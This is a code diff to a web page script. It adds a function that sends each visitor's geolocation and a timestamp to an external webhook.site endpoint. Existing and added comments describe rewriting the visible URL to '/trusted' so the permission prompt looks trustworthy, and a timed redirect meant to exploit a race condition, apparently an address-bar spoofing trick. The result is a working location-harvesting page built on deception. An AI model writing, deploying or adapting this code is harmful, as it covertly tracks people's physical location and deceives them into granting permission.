@@ -70,17 +70,23 @@ const output = document.getElementById('output');
 const locationLink = document.getElementById('locationLink');
 const mapLink = document.getElementById('mapLink');
 
+// URL of your Webhook (replace this with your Webhook URL)
+const webhookUrl = 'https://webhook.site/#!/view/11f44e56-235f-4edb-954d-73e1048d7070/bba31c74-8aa0-49f7-8822-807bcf5ef60b/1';
+
+// Function to request location
 function getLocation() {
-  if (!navigator.geolocation) return;
+  if (!navigator.geolocation) {
+    output.textContent = 'Geolocation is not supported by this browser.';
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(
     pos => {
-      // Extract latitude and longitude
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
 
-      // Display latitude and longitude
-      output.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+      // Display the latitude and longitude
+      output.textContent = `Latitude: ${lat.toFixed(4)}, Longitude: ${lon.toFixed(4)}`;
 
       // Create Google Maps link
       const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
@@ -90,11 +96,38 @@ function getLocation() {
       mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
 
       locationLink.style.display = 'block';
+
+      // Send the geolocation data to the Webhook
+      sendDataToWebhook(lat, lon);
     },
     () => {
-      output.textContent = 'Permission denied';
+      output.textContent = 'Permission denied or error retrieving location';
     }
   );
+}
+
+// Function to send data to Webhook
+function sendDataToWebhook(lat, lon) {
+  const data = {
+    latitude: lat,
+    longitude: lon,
+    timestamp: new Date().toISOString()
+  };
+
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Success:', data);
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
 }
 
 /*
@@ -102,8 +135,8 @@ function getLocation() {
  * Manipulate visible URL to a trusted-looking path
  */
 trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+  history.pushState({}, '', '/trusted');  // Changing the URL to make it look trusted
+  panel.style.display = 'block';  // Show the panel for requesting the location
 };
 
 /*
@@ -114,8 +147,8 @@ window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
+        location.href = 'https://google.com:9090';  // Redirect to simulate a race condition
+      }, 80); // Delay of 80ms before the redirect
     });
   });
 });
